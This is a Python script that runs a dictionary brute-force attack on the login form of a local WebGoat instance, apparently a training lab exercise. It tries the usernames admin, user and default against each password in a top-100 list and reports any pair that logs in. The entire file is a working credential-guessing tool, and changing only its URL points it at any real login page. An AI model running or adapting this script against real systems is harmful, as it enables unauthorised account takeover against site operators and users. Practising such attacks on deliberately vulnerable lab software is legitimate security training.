import requests
import sys

# Target login URL of the local WebGoat application
login_url = "http://localhost:8080/WebGoat/login"

# List of usernames to attempt the brute force attack with
usernames_to_test = ["admin", "user", "default"]

# Path to the file containing a list of passwords to test
password_file_path = "10-million-password-list-top-100.txt"

# A unique string that indicates a successful login
login_success_indicator = "WebWolf"

# Iterate over each username
for username in usernames_to_test:
    # Open the password file and iterate over each password
    with open(password_file_path, "r") as password_list:
        for password in password_list:
            # Remove trailing newline character from password and encode it for the request
            password = password.strip("\n").encode()
            
            # Print the current attempt to the console
            sys.stdout.write(f"[X] Attempting user:password -> {username}:{password.decode()}\r")
            sys.stdout.flush()
            
            # Make a POST request to the login URL with the current username and password
            response = requests.post(login_url, data={"username": username, "password": password})
            
            # Check if the login_success_indicator is in the response content
            if login_success_indicator.encode() in response.content:
                # Print the success message
                sys.stdout.write("\n")
                sys.stdout.write(f"\t[>>>] Valid password '{password.decode()}' found for user '{username}'!")
                
                # Exit the script after finding a valid password for a user
                sys.exit()
        
        # After testing all passwords for a username, flush the output and print a message indicating no password was found
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write(f"\tNo password found for '{username}'!")
        sys.stdout.write("\n")